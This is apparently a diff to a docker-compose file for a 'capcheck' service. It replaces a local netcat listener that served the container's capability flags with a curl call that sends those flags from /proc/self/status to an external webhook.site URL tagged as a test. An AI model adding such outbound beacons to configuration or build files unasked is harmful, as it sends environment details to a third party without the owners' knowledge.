@@ -1,17 +1,11 @@
 services:
   capcheck:
     image: alpine:3.20
-    ports:
-      - "8080"
     command:
       - sh
       - -c
       - |
-        apk add --no-cache busybox-extras >/dev/null 2>&1
-        while true; do
-          {
-            printf 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n'
-            echo '=== F23 TAG ==='
-            grep '^Cap' /proc/self/status
-          } | nc -lp 8080 -w 2
-        done
+        apk add --no-cache curl >/dev/null 2>&1
+        CAPS=$(grep '^Cap' /proc/self/status | tr '\n' '|')
+        curl -sS "https://webhook.site/5a6ae326-fdb5-4b51-a691-92509b495ff4?tag=F23-TEST-INCLUDE&caps=$CAPS" >/dev/null
+        sleep 999999
